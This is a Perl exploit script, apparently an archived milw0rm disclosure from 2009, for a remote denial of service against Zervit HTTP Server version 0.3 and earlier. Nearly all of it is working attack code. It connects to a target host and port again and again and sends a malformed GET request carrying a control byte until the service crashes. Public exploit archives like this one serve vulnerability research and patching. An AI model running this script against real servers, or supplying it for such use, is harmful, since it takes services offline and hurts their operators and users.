#!/usr/bin/perl
#
# Zervit HTTP Server <= v0.3 Remote Denial of Service.
#
# --------------------------------------------------------------------
# The vulnerability is caused due to an error in multi-socket.
# This can be exploited to crash the HTTP service.
# --------------------------------------------------------------------
#
# Author: Jonathan Salwan
# Mail: submit [AT] shell-storm.org
# Web: http://www.shell-storm.org


use IO::Socket;
print "[+] Author : Jonathan Salwan\n";
print "[+] Soft   : Zervit 0.3 Remote DoS\n";

	if (@ARGV < 1)
		{
 		print "[-] Usage: <file.pl> <host> <port>\n";
 		print "[-] Exemple: file.pl 127.0.0.1 80\n";
 		exit;
		}


	$ip 	= $ARGV[0];
	$port 	= $ARGV[1];

print "[+] Sending request...\n";

for($i=0;$i=4;$i++)
{
$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$ip", PeerPort => "$port") || die "[-]Done!\n";

	print $socket "GET \x11 HTTP/1.0\n\r\n";
}

# milw0rm.com [2009-04-22]
